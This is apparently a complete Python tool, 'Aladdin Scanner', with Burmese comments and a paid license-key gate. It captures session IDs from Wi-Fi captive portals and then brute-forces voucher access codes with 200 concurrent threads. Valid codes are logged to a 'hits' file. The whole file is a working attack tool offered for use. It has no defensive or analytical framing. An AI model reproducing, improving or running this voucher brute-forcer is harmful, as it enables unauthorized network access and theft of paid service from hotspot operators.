import requests
import random
import string
import time
import os
import threading
import re
import sys
import urllib3
import hashlib
from queue import Queue, Empty
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# CONFIGURATION
# ===============================
# သင်၏ GitHub Raw Link ကို ဤနေရာတွင် အစားထိုးပါ
GITHUB_KEY_URL = "https://raw.githubusercontent.com/yourusername/reponame/main/key.txt"
LOCAL_AUTH_FILE = os.path.expanduser("~/.ald_auth_config.txt")
SAVE_PATH = "/storage/emulated/0/zapya/hits.txt"
STATS_FILE = "/storage/emulated/0/zapya/total_stats.txt"

# အရောင်များ
B_CYAN = "\033[1;36m"; RESET = "\033[0m"; B_GREEN = "\033[1;32m"
B_RED = "\033[1;31m"; YELLOW = "\033[0;33m"; CYAN = "\033[0;36m"
MAGENTA = "\033[1;35m"; WHITE = "\033[1;37m"

# Performance Settings
NUM_THREADS = 200             
SESSION_POOL_SIZE = 50        
PER_SESSION_MAX = 300         
CODE_LENGTH = 6 
CHAR_SET = string.digits 

# ==============================
# ALD SECURITY SYSTEM (ID|KEY|DATE)
# ==============================
def get_ald_id():
    """ALD- နှင့်စသော Unique Device ID logic"""
    try:
        uid = str(os.getuid()) if hasattr(os, 'getuid') else "1000"
        user = os.environ.get('USER', 'unknown')
        combined = f"{uid}{user}{sys.platform}"
        hash_val = hashlib.md5(combined.encode()).hexdigest()[:8].upper()
        return f"ALD-{hash_val}"
    except: return "ALD-ERROR-ID"

def verify_key_logic(key_data, user_input_key, my_id):
    """
    Format: Device ID|Access Key|Expired date
    Example: ALD-8CC8C4AD|ALADDIN-777|2026-12-31 23:59
    """
    for line in key_data.splitlines():
        parts = line.strip().split("|")
        if len(parts) == 3:
            db_id, db_key, expiry_str = parts
            # ID ရော Key ရော ကိုက်ညီမှု ရှိမရှိ စစ်ဆေးခြင်း
            if db_id == my_id and db_key == user_input_key:
                try:
                    expiry_date = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M")
                    if datetime.now() < expiry_date:
                        return True, expiry_date
                except: continue
    return False, None

def check_approval():
    os.system('clear')
    my_id = get_ald_id()
    
    # Banner
    print(f"{B_CYAN}    .---.      .---.      .---.    {RESET}")
    print(f"{B_CYAN}   / ALD \    / ALD \    / ALD \   {RESET}")
    print(f"{WHITE}  |   __  |  |   __  |  |   __  |  {RESET}")
    print(f"{CYAN}   \______/    \______/    \______/   {RESET}")
    print(f"{MAGENTA}      A L A D D I N   S C A N N E R    {RESET}")
    print(f"{B_CYAN}══════════════════════════════════════════════════{RESET}")
    print(f" {WHITE}DEVICE ID : {YELLOW}{my_id}{RESET}")
    print(f"{B_CYAN}══════════════════════════════════════════════════{RESET}")

    user_key = ""
    # Local မှာ အရင်စစ်
    if os.path.exists(LOCAL_AUTH_FILE):
        with open(LOCAL_AUTH_FILE, "r") as f:
            saved = f.read().split("|")
            if len(saved) >= 2: user_key = saved[1]

    if not user_key:
        user_key = input(f"{WHITE} [>] Enter Your Access Key: {B_CYAN}").strip()

    is_auth = False
    exp_date = None

    # Online Check
    try:
        r = requests.get(GITHUB_KEY_URL, timeout=5)
        if r.status_code == 200:
            is_auth, exp_date = verify_key_logic(r.text, user_key, my_id)
            if is_auth:
                with open(LOCAL_AUTH_FILE, "w") as f:
                    # Local မှာလည်း format အတိုင်းသိမ်း
                    f.write(f"{my_id}|{user_key}|{exp_date.strftime('%Y-%m-%d %H:%M')}")
    except:
        # Offline Check
        if os.path.exists(LOCAL_AUTH_FILE):
            with open(LOCAL_AUTH_FILE, "r") as f:
                is_auth, exp_date = verify_key_logic(f.read(), user_key, my_id)
                if is_auth: print(f"{YELLOW} [!] Mode: Offline Verification{RESET}")

    if is_auth:
        print(f"{B_GREEN} [✓] ACCESS GRANTED!{RESET}")
        print(f"{WHITE} EXPIRY: {CYAN}{exp_date.strftime('%d/%m/%Y %I:%M %p')}{RESET}")
        time.sleep(2)
        return True
    else:
        if os.path.exists(LOCAL_AUTH_FILE): os.remove(LOCAL_AUTH_FILE)
        print(f"{B_RED} [❌] ACCESS DENIED / KEY MISMATCH{RESET}")
        return False

# ==============================
# SCANNING ENGINE
# ==============================
session_pool = Queue()
valid_codes = [] 
tried_codes = set()
valid_lock = threading.Lock()
file_lock = threading.Lock()
DETECTED_BASE_URL = None
TOTAL_HITS = 0
CURRENT_CODE = ""
START_TIME = time.time()
stop_event = threading.Event()

if os.path.exists(STATS_FILE):
    try:
        with open(STATS_FILE, "r") as f: TOTAL_TRIED = int(f.read().strip())
    except: TOTAL_TRIED = 0
else: TOTAL_TRIED = 0

def save_progress():
    try:
        os.makedirs(os.path.dirname(STATS_FILE), exist_ok=True)
        with file_lock:
            with open(STATS_FILE, "w") as f: f.write(str(TOTAL_TRIED))
    except: pass

def get_sid_from_gateway():
    global DETECTED_BASE_URL
    s = requests.Session()
    try:
        r1 = s.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
        path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
        final_url = urljoin(r1.url, path_match.group(1)) if path_match else r1.url
        if path_match:
            r2 = s.get(final_url, timeout=5)
            final_url = r2.url
        parsed = urlparse(final_url)
        DETECTED_BASE_URL = f"{parsed.scheme}://{parsed.netloc}"
        sid = parse_qs(parsed.query).get('sessionId', [None])[0]
        return sid
    except: return None

def session_refiller():
    while not stop_event.is_set():
        try:
            if session_pool.qsize() < SESSION_POOL_SIZE:
                sid = get_sid_from_gateway()
                if sid: session_pool.put({'sessionId': sid, 'left': PER_SESSION_MAX})
            time.sleep(1)
        except: time.sleep(2)

def worker_thread():
    global TOTAL_TRIED, TOTAL_HITS, CURRENT_CODE
    thr_session = requests.Session()
    headers = {'Content-Type': 'application/json', 'Connection': 'keep-alive'}
    while not stop_event.is_set():
        try:
            if not DETECTED_BASE_URL:
                time.sleep(1); continue
            try: slot = session_pool.get(timeout=2)
            except Empty: continue
            
            code = ''.join(random.choices(CHAR_SET, k=CODE_LENGTH))
            if code in tried_codes: continue
            tried_codes.add(code)
            CURRENT_CODE = code
            
            r = thr_session.post(f"{DETECTED_BASE_URL}/api/auth/voucher/", 
                                 json={'accessCode': code, 'sessionId': slot['sessionId'], 'apiVersion': 1}, 
                                 headers=headers, timeout=6)
            TOTAL_TRIED += 1
            if TOTAL_TRIED % 50 == 0: save_progress()
            
            if "true" in r.text.lower():
                with valid_lock:
                    if code not in valid_codes:
                        valid_codes.append(code)
                        TOTAL_HITS += 1
                        save_locally(code, slot['sessionId'])
            
            slot['left'] -= 1
            if slot['left'] > 0: session_pool.put(slot)
        except: pass

def save_locally(code, sid):
    ts = datetime.now().strftime("%I:%M %p")
    try:
        os.makedirs(os.path.dirname(SAVE_PATH), exist_ok=True)
        with file_lock:
            with open(SAVE_PATH, "a") as f: f.write(f"[{ts}] {code} | SID: {sid}\n")
    except: pass

def live_dashboard():
    while not stop_event.is_set():
        os.system('clear')
        elapsed = time.time() - START_TIME
        speed = (TOTAL_TRIED / elapsed) if elapsed > 0 else 0
        print(f"{B_CYAN}╔════════════════════════════════════════════╗{RESET}")
        print(f"{B_CYAN}║{WHITE}   🧞 ALADDIN TURBO ENGINE - ACTIVATED    {B_CYAN}║{RESET}")
        print(f"{B_CYAN}╠════════════════════════════════════════════╣{RESET}")
        print(f"{B_CYAN}║{WHITE}  [Σ] ATTEMPTS : {CYAN}{TOTAL_TRIED:,}{' '*(20-len(str(TOTAL_TRIED)))} {B_CYAN}║{RESET}")
        print(f"{B_CYAN}║{WHITE}  [★] SUCCESS  : {B_GREEN}{TOTAL_HITS}{' '*(20-len(str(TOTAL_HITS)))} {B_CYAN}║{RESET}")
        print(f"{B_CYAN}║{WHITE}  [⚡] SPEED    : {YELLOW}{speed:.1f} c/s{' '*(18-len(f'{speed:.1f}'))} {B_CYAN}║{RESET}")
        print(f"{B_CYAN}║{WHITE}  [>] CURRENT  : {WHITE}{CURRENT_CODE}{' '*(20-len(CURRENT_CODE))} {B_CYAN}║{RESET}")
        print(f"{B_CYAN}╚════════════════════════════════════════════╝{RESET}")
        
        print(f"\n{MAGENTA}RECENT SUCCESS HITS:{RESET}")
        for c in valid_codes[-3:]:
            print(f" {B_GREEN}┏━━ FOUND ━━━━━━━━━━━━━━┓{RESET}")
            print(f" {B_GREEN}┃  CODE: {WHITE}{c}      {B_GREEN}┃{RESET}")
            print(f" {B_GREEN}┗━━━━━━━━━━━━━━━━━━━━━━━┛{RESET}")
        time.sleep(1.0)

def select_mode():
    print(f"\n{CYAN}┌───[ SELECT MODE ]{RESET}")
    print(f"{CYAN}│{RESET} [1] 6-Digit  [2] 7-Digit")
    print(f"{CYAN}│{RESET} [3] 8-Digit  [4] Aladdin Special (7L Alpha-Num)")
    print(f"{CYAN}└───╼{RESET}")
    c = input(f" Choice > ")
    global CODE_LENGTH, CHAR_SET
    if c == "2": CODE_LENGTH = 7
    elif c == "3": CODE_LENGTH = 8
    elif c == "4": 
        CODE_LENGTH = 7
        CHAR_SET = string.ascii_lowercase + string.digits
    else: CODE_LENGTH = 6

if __name__ == "__main__":
    if check_approval():
        select_mode()
        try:
            threading.Thread(target=session_refiller, daemon=True).start()
            threading.Thread(target=live_dashboard, daemon=True).start()
            for _ in range(NUM_THREADS):
                threading.Thread(target=worker_thread, daemon=True).start()
            while True: time.sleep(1)
        except KeyboardInterrupt:
            stop_event.set()
            save_progress()
            print(f"\n{B_RED}[!] Aladdin Engine Stopped.{RESET}")
                                                     
